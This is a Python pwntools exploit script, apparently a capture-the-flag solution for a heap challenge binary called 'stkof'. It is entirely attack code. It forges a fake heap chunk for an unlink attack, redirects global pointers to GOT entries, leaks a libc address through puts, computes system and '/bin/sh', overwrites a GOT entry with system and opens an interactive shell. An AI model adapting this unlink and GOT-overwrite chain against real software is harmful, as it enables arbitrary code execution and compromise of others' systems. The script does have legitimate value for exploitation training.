from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./stkof"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

context.arch = "amd64"

def add(size):
    p.sendline("1")
    p.sendline(str(size))
    # p.recvuntil("OK\n")

def free(idx):
    p.sendline("3")
    p.sendline(str(idx))
    # p.recvuntil("OK\n")

def edit(idx,content):
    p.sendline("2")
    p.sendline(str(idx))
    p.sendline(str(len(content)))
    p.send(str(content))
    # p.recvuntil("OK\n")

# chunk1 padding
add(0x100)

# chunk2 fake
add(0x30)
add(0x80)

# fake chunk data
head = 0x602140
payload = p64(0)  #prev_size
payload += p64(0x20)  #size
payload += p64(head + 16 - 0x18)  #fd
payload += p64(head + 16 - 0x10)  #bk
payload += p64(0x20)  # next chunk's prev_size bypass the check
payload = payload.ljust(0x30, 'a')

# fake next chunk prev_size
payload += p64(0x30)

# fake next chunk size && not in use bit
payload += p64(0x90)

edit(2,payload)

# start unlink attack
free(3)

# write got addrs to global buffer
payload = flat([
    "a"*8,
    elf.got["free"],
    elf.got["puts"],
    elf.got["atoi"]
    ])

edit(2,payload)

# leak
payload = flat([
    elf.plt["puts"]
    ])
edit(0,payload)
gdb.attach(p)
free(1)
p.recv(27)
puts_addr = u64(p.recv(6).ljust(8, '\x00'))
log.success("puts_addr is -> " + hex( puts_addr ))
libc_base = puts_addr - libc.sym["puts"]

system_addr = libc_base + libc.sym["system"]
sh_addr = libc_base + libc.search("/bin/sh").next()
log.success("sh_addr is -> " + hex( sh_addr ))

payload = flat([
    system_addr
    ])
edit(2,payload)
p.send("/bin/sh")

p.interactive()
